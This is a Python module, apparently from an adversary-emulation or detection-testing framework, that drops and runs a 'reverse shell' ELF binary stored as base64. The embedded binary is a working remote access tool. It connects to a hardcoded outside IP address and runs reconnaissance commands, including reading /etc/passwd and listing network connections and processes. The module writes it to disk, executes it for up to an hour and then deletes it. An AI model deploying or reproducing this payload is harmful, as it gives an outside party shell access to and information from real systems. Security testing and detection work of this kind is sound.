try:
    from framework.main import ModuleBase
except ImportError:
    pass

class ReverseShellOnDiskElf(ModuleBase):
    # This does the same thing as Python rats above
    ELF = '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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAcwAAAAEAAAAGAAAAAAAAALQIQAAAAAAAtAgAAAAAAAAJAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAHkAAAABAAAAAgAAAAAAAADACEAAAAAAAMAIAAAAAAAAdwAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACBAAAAAQAAAAIAAAAAAAAAOAlAAAAAAAA4CQAAAAAAADQAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAjwAAAAEAAAACAAAAAAAAAHAJQAAAAAAAcAkAAAAAAAD0AAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAJkAAAAOAAAAAwAAAAAAAAAQDmAAAAAAABAOAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAClAAAADwAAAAMAAAAAAAAAGA5gAAAAAAAYDgAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAsQAAAAYAAAADAAAAAAAAACAOYAAAAAAAIA4AAAAAAADQAQAAAAAAAAUAAAAAAAAACAAAAAAAAAAQAAAAAAAAALoAAAABAAAAAwAAAAAAAADwD2AAAAAAAPAPAAAAAAAAEAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAC/AAAAAQAAAAMAAAAAAAAAABBgAAAAAAAAEAAAAAAAAGgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAyAAAAAEAAAADAAAAAAAAAIAQYAAAAAAAgBAAAAAAAACAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAM4AAAAIAAAAAwAAAAAAAAAAEWAAAAAAAAARAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAADTAAAAAQAAADAAAAAAAAAAAAAAAAAAAAAAEQAAAAAAABEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAEREAAAAAAADcAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAA=='

    @property
    def tags(self):
        return ['IntrusionSet4']

    @property
    def relative_delay(self):
        return 70

    @property
    def absolute_duration(self):
        return 60 * 60

    def do_run(self):
        import base64, stat, os
        elf = base64.b64decode(self.ELF)
        fname = '${ELF_TMPFILE}'
        with open(fname, 'wb') as f:
            f.write(elf)
        os.chmod(fname, stat.S_IRUSR|stat.S_IWUSR|stat.S_IXUSR)
        pid = self.util_childproc(fname=fname, args=(fname,))
        self.hec_logger('Kicked off ELF', filename=fname, pid=pid)
        self.util_orphanwait(pid, timeout=self.absolute_duration)
        os.unlink(fname)
        self.hec_logger('Removed RAT from disk', filename=fname)

    def run(self):
        self.start()
        try:
            self.do_run()
        except Exception as e:
            self.hec_logger('Uncaught exception within module, exiting module gracefully', error=str(e),
                            severity='error')
        self.finish()
